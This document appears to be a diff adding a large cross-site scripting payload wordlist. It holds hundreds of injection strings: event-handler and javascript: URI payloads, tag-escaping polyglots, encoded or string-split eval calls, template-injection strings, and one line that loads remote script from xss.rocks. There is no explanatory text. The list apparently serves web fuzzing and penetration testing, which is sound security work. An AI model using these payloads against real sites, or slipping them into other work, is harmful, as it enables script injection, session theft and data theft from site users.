+'<img src=img.png tabindex='0' onfocus=alert(//)>
+'<img src=img.png tabindex='0' onfocus=confirm(//)>
+'<img src=img.png tabindex='0' onfocus=prompt(//)>
+'<img src=img.png tabindex='0' onblur=alert()>
+'<img src=img.png tabindex='0' onblur=confirm()>
+'<img src=img.png tabindex='0' onblur=prompt()>
+'<img src=img.png tabindex='0' onblur=alert(0)>
+'<img src=img.png tabindex='0' onblur=confirm(0)>
+'<img src=img.png tabindex='0' onblur=prompt(0)>
+'<img src=img.png tabindex='0' onblur=alert(//)>
+'<img src=img.png tabindex='0' onblur=confirm(//)>
+'<img src=img.png tabindex='0' onblur=prompt(//)>
+'<video src="video.mp4" onloadstart=alert()></video>
+'<video/src='video.mov'/controls/onerror=confirm()></video>
+'<svg/onload=confirm()>
+'<svg/////////////onload ='confirm()'//////>
+'<input/oncut=confirm()>
+'<div contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="true"/oncopy=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<div/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'<span contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='true' oncut=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='false'/oncut=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='false'/oncopy=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='false'/onpaste=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'<span/contenteditable='false'/onclick=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'<p contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable='true' onclick=confirm();>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'<embed src="example.pdf" type="application/pdf" onload=confirm()>
+'< script>prompt(/'1/')</script >
+'<svg/onload​=import()
+'<svg onload="eval(atob('Y29uZmlybSgp'))"></svg>
+'<svg onload="eval(String.fromCharCode(99,111,110,102,105,114,109,40,41))"></svg>
+'<svg onload="(() => { eval('co' + 'nfi' + 'rm()'); })()"></svg>
+'<svg onload="this['co' + 'nfi' + 'rm']()"></svg>
+'<svg onload="setTimeout('confirm()', 0)"></svg>
+'<svg onactivate="import('Activated!')" width="100" height="100"></svg>
+'<img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+'<svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+'<img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+'<svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+'<img src="example.png" onload="eval(String.fromCharCode(97,108,101,114,116,40,39,79,75,39,41))">
+'<svg width="100" height="100" onmouseover="eval(String.fromCharCode(99,111,110,102,105,114,109,40,39,72,101,108,108,111,39,41))"></svg>
+'<img src="example.png" onload="eval('ale' + 'rt' + '(' + '\'OK\'' + ')')">
+'<svg width="100" height="100" onmouseover="eval('con' + 'firm' + '(' + '\'¿Seguro?\'' + ')')"></svg>
+'<img src="example.png" onload="(function(x){eval(x)})('alert(\\'OK\\')')">
+'<svg width="100" height="100" onmouseover="(function(x){eval(x)})('confirm(\\'¿Seguro?\\')')"></svg>
+'<svg width="100" height="100" onmouseover="window['confirm']('¿Listo?')"></svg>
+'<img src="example.png" onload="let f={'a':'alert','c':'confirm'};window[f['a']]('OK')">
+'<svg width="100" height="100" onmouseover="let f={'a':'alert','c':'confirm'};window[f['c']]('¿Seguro?')"></svg>
+'<img src="example.png" onload="(()=>{eval('alert(\\'OK\\')')})()">
+'<svg width="100" height="100" onmouseover="(()=>{eval('confirm(\\'¿Seguro?\\')')})()"></svg>
+'<img src="example.png" onload="setTimeout('alert(\\'OK\\')', 100)">
+'<svg width="100" height="100" onmouseover="setTimeout('confirm(\\'¿Seguro?\\')', 100)">
+'<img src="example.png" onload="eval(atob('ZW' + 'xh' + 'cnQoJ09LJyk='))">
+'<svg width="100" height="100" onmouseover="eval(String.fromCharCode(...[99,111,110,102,105,114,109,40,39,79,75,39,41]))"></svg>
+'<object data="example.pdf" type="application/pdf" onload="alert('El objeto se cargó')"></object>
+'<embed src="example.pdf" type="application/pdf" onload="confirm('¿Cargar contenido?')">
+'<video controls><source src="video.mp4" type="video/mp4"><track src="subtitles.vtt" kind="subtitles" label="Español" onload="alert('Subtítulos cargados')"6></video>
+alert(1)//
+%22write('<script>alert(1)</script>')%22 
+alert;throw 1
+javascript:javascript:alert(1)
+alert(document.domain)
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+</title><script>alert(1);</script>
+</title><script x> alert(1) </script 1=2
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<input type=image src onerror="prompt(1)">
+<svg onload=alert(1)//
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src='1' onerror='alert(0)' <
+<script x> alert(1) </script 1=2
+<script x>alert('XSS')<script y>
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+<svg////////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x`onload=alert(1)>
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+</title><script>$=1,alert($)</script>
+</title><script ~~~>confirm(1)</script ~~~>
+</title><script>$=1,\u0061lert($)</script>
+</title><</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+</title><</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</title><scRipt>alert(1)</scRipt>
+<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<svg><x><script>alert('1'&#41</x>
+<iframe src=""/srcdoc='<svg onload=alert(1)>'>
+<svg><animate onbegin=alert() attributeName=x></svg>
+<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
+<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"
+"<iframe/src=javascript:confirm(1)"
+"javascript:alert('XSS');"
+"alert(1);"
+{{_openBlock.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+javascript\x0A:javascript:alert(1)
+\x1Cjavascript:javascript:alert(1)
+\xE2\x81\x9Fjavascript:javascript:alert(1)
+\xE2\x80\x85javascript:javascript:alert(1)
+javascript:alert(1)
+javascript:confirm(1)
+javascript\x0A:javascript:confirm(1)
+\x1Cjavascript:javascript:confirm(1)
+\xE2\x81\x9Fjavascript:javascript:confirm(1)
+\xE2\x80\x85javascript:javascript:confirm(1)
+alert('XSS')
+confirm(1)
+'''jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk={callback} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd={callback}//>\x3e'''
+'''"'-function(){{{callback}}}()-">\"><scrIpt>{callback}</scrIpt><aUdio src=x oNerror={callback}><"-'-function(){{{callback}}}()"'''
+"'--></noscript></noembed></template></title></textarea></style><script>alert()</script>
+'"--></title></textarea></style></noscript></noembed></template></frameset><svg onload=alert()>
+"'>-->*/</noscript></ti tle><script>alert()</script>
+"'--></style></script><svg oNload=alert()>
+jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+jaVas%0Cript:/*--></tit%0le></st%0yle></text%0area></scri%0pt></xm%0p><sv%0g/on%0load='+/"/+/onmou%0seover=1/+/[*/[]/+al%0ert(1)//'>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//> 
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>` 
+javascript:`/*\"/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/<i<frame */ onload=alert()//</script>
+javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert()//</Script> 
+javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert()//<</script>`
+javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert()//<</script>` 
+javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg"///*/ onload=alert()//</script> 
+javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/<svg/*/onload= alert()//</script> 
+javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/<svg */ onload=alert()//</script> 
+javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*<svg <frame */ onload=alert()//</script> 
+javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame <svg */ onload=alert()//</script> 
+javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*<svg <frame onload=/**/alert()//</script>
+javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>--><<script>alert()<</script><frame/*/ onload=alert()//>
+javascript:alert()"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//<svg <frame */onload= alert()//</script>
+javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert()--><<svg/*/ onload=alert()//>
+javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert()//--><<sVg/onload=alert``> 
+javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]<<script>///<frame */ onload=alert()//<</script>
+javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert()><<svg/onload= /**/alert()//>
+javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script><<script> /**/alert()//<</script><frame onload=alert()>
+javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script><<script>/*` /*<frame src=javascript:/**/alert()//><</script>
+javascript:"/*'/*\"/*` /**/alert()//--></title></textarea></style></noscript></noembed></template></script><script>alert()</script><svg/<frame/onload=alert()>
+javascript:/*"/*`/*'/*\"/*-->*/ alert()//</title></textarea></style></noscript></noembed></template></script></select><frame/onload=alert``><<svg/onload=alert()>
+javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/"/'/*--><frame onload=alert()><svg/\"/*<svg onload=' /**/-alert()//'>javascript:/*`/*\"/*'/*</noembed>"/*<frame src=javascript:/**/;alert()//--></title></textarea></style></noscript></template></select></script><<svg/onload= alert()//>
+javascript:alert()//"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>*/ alert()//<frame onload=alert()><<script>alert()<</script>
+javascript:alert()//'//"//\"//-->`//*/ alert();//</title></textarea></style></noscript></noembed></template><frame onload=alert()></select></script><<svg onload=alert()>
+javascript:/*"/*\"/*`/*'/**/ (alert())//</title></textarea></style></noscript></script></noembed></template></select><frame src=javascript:alert()--><<svg/onload=alert()>
+javascript:/*"/*'/*\"/*`/*><frame src=javascript:alert()></template </textarea </title </style </noscript </noembed </script --><<script>alert()<</script>\ /**/alert()//
+javascript:/*`/*'/*'/*"-/*\"/**/ alert()//></title></textarea></style></select></script></noembed></noscript></template>--><<svg/onload=alert()><frame/src=javascript:alert()>
+javascript:'/*`/*'/*"/*\"/*<FRAME SRC= javascript:/**/-alert()//--></title></textarea></style></noscript></noembed></template></script><script>//<svg onload= alert()//</script>
+javascript:alert()//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert()></script>*///\"//`//'//"//><svg <svg onload=alert()> alert()//
+javascript:alert()//'//"//\"; '/`/*\/*'/*"/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script>alert()</script>
+javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg onload=alert()><frame src=javascript:alert()>
+javascript:alert()//\"//`//'//"//--></style></select></noscript></noembed></template></title></textarea></script><iframe/srcdoc="<svg/onload=alert()>"><frame/onload=alert()>*/ alert()//
+javascript:alert()//*-->*`/*'/*"/*\"/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg onload=alert()>*/ alert()//</script>
+jaVasCript:/*`/*\`/*'/*\"//"/**/(onload=alert())//<svg/onload=alert()><frame/onload=alert()></select></noscript></noembed></template></stYle/</titLe/</teXtarEa/</script/--><sVg/oNloAd= alert()//>
+javascript:alert()//'//"//`//></a></option></select></template></noscript></script></title></style></textarea></noembed>--><<svg onload=alert()>\">alert()//*/ alert()//<frame src=javascript:alert()>
+javascript:alert()//\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload=";alert();"></script>--><script>alert`;alert();`</script>*/alert()//\";alert()//
+javascript:alert/*`/*\/*'/*\"/*"/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script>alert()</script>
+javascript:alert();//</title></noscript></noembed></template></style></textarea><frameset onload='+/"/+/[*/[]/+alert()//'-->\" alert();/*`/**/(/**/alert())//<script>alert()</script><<svg onload=alert()>>
+javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//
+javascript:alert()//\";alert();/*-/*`/*\`/*'/*"/**///--><FRAME SRC="javascript:alert();"></textarea></style></noscript></noembed></template></option></select></script></title><svg/onload=alert()><svg/onload=alert()> alert(1)// 
+javascript:alert()//<frame/src=javascript:alert()><svg/onload=alert()>`;alert()`';alert()//\";alert();//"//--></title></textarea></style></noscript></noembed></template></option></select></script><svg onload=alert()>*/ alert()//* 
+javascript:alert()//</title></style></textarea></noscript></template></noembed><script>alert()</script>-->\";alert()//";alert()//';alert()//<script>alert()</script><frame src="javascript:alert()">` alert()//<svg/onload=alert()>*/alert()/* 
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!-- 
+javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/"/+/onclick=1/+/[*/[]/+alert()//'>"><svg/onload=`+/"/+/onclick=/+/[*/[]/+alert()//'>"><script>alert()</script><frame src="javascript:alert()"></frameset>+\"; alert()//<img src onerror=alert()>
+javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)// 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+"!'/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
+"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
+"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
+"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
+"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
+"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
+"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
+"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><iframe src="javascript:alert(XSS)">
+"><img src="x:x" onerror="alert(XSS)">
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+"`'><script>-javascript:alert(1)</script>
+"`'><script>\x00javascript:alert(1)</script>
+"`'><script>\x09javascript:alert(1)</script>
+"`'><script>\x0Ajavascript:alert(1)</script>
+"`'><script>\x0Bjavascript:alert(1)</script>
+"`'><script>\x0Cjavascript:alert(1)</script>
+"`'><script>\x0Djavascript:alert(1)</script>
+"`'><script>\x20javascript:alert(1)</script>
+"`'><script>\x21javascript:alert(1)</script>
+"`'><script>\x2Bjavascript:alert(1)</script>
+"`'><script>\x3Bjavascript:alert(1)</script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+"`'><script>\xC2\x85javascript:alert(1)</script>
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
+"`'><script>\xE2\x80\x80javascript:alert(1)</script>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+"`'><script>\xE2\x80\x82javascript:alert(1)</script>
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+"`'><script>\xE2\x80\x84javascript:alert(1)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
+"`'><script>\xE3\x80\x80javascript:alert(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
